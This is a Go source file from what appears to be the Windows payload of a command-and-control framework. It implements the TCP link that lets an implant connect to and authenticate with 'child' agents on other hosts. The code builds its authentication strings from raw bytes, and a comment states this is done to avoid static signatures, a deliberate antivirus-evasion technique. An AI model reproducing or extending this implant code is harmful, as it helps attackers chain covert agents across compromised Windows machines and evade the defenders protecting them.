// server/docker/payloads/Windows/link_tcp.go
// TCP client for connecting to TCP child agents

//go:build windows
// +build windows

package main

import (
	"fmt"
	"net"
	"time"
)

// Auth strings (constructed to avoid static signatures)
var (
	lmAuthPrefixTCP = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a}) // AUTH:
	lmAuthOKTCP     = string([]byte{0x4f, 0x4b})                   // OK
)

// dialTCP connects to a TCP agent at the specified address
func dialTCP(address string, timeout time.Duration) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return nil, err
	}

	// Enable TCP keepalive
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	return conn, nil
}

// performLinkAuthTCP performs simple challenge-response authentication when connecting to a TCP agent
// This mirrors the SMB link authentication pattern for consistency
func performLinkAuthTCP(conn net.Conn) error {
	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Step 1: Read 32-byte challenge from TCP agent
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Step 2: Send "AUTH:" + challenge
	response := append([]byte(lmAuthPrefixTCP), challenge...)
	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Step 3: Read "OK" confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOKTCP {
		return fmt.Errorf(Err(E3))
	}

	return nil
}
